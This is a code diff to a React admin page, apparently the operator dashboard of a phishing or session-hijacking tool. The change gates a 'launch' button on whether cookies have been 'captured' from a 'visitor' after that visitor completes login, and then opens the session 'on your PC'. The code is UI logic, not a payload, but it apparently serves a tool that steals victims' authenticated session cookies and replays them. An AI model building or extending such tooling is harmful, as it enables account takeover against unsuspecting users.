@@ -105,7 +105,14 @@ export default function AdminProfilesPage() {
 
   const handleLaunch = async (id: string) => {
     const profile = profiles.find(p => p.id === id);
-    if (profile && profile.authStatus !== 'AUTHENTICATED') {
+    if (!profile) return;
+    
+    if (!profile.cookies || profile.cookies.length === 0) {
+      toast.error('No cookies captured yet — visitor needs to complete authentication first');
+      return;
+    }
+    
+    if (profile.authStatus !== 'AUTHENTICATED') {
       toast.error('Profile not authenticated yet — wait for the visitor to complete login');
       return;
     }
@@ -397,13 +404,20 @@ export default function AdminProfilesPage() {
                         >
                           <X className="h-4 w-4 text-[#EF4444]" />
                         </button>
-                      ) : (profile.cookies && profile.cookies.length > 0) ? (
+                      ) : (
                         <button
                           onClick={() => handleLaunch(profile.id)}
-                          disabled={actionLoading === profile.id || launchPending.has(profile.id)}
-                          className="p-2 hover:bg-white/10 rounded-lg transition-colors disabled:opacity-50"
+                          disabled={
+                            actionLoading === profile.id || 
+                            launchPending.has(profile.id) ||
+                            !profile.cookies ||
+                            profile.cookies.length === 0
+                          }
+                          className="p-2 hover:bg-white/10 rounded-lg transition-colors disabled:opacity-30"
                           title={
-                            profile.authStatus !== 'AUTHENTICATED'
+                            !profile.cookies || profile.cookies.length === 0
+                              ? 'No cookies captured yet'
+                              : profile.authStatus !== 'AUTHENTICATED'
                               ? 'Not authenticated yet'
                               : launchPending.has(profile.id)
                               ? 'Opening on your PC...'
@@ -411,14 +425,16 @@ export default function AdminProfilesPage() {
                           }
                         >
                           <Monitor className={`h-4 w-4 ${
-                            profile.authStatus !== 'AUTHENTICATED'
+                            !profile.cookies || profile.cookies.length === 0
+                              ? 'text-white/20'
+                              : profile.authStatus !== 'AUTHENTICATED'
                               ? 'text-white/30'
                               : launchPending.has(profile.id)
                               ? 'text-[#4F7FFF] animate-pulse'
                               : 'text-white/70'
                           }`} />
                         </button>
-                      ) : null}
+                      )}
                       <button
                         onClick={() => setSelectedProfile(profile)}
                         className="p-2 hover:bg-white/10 rounded-lg transition-colors"
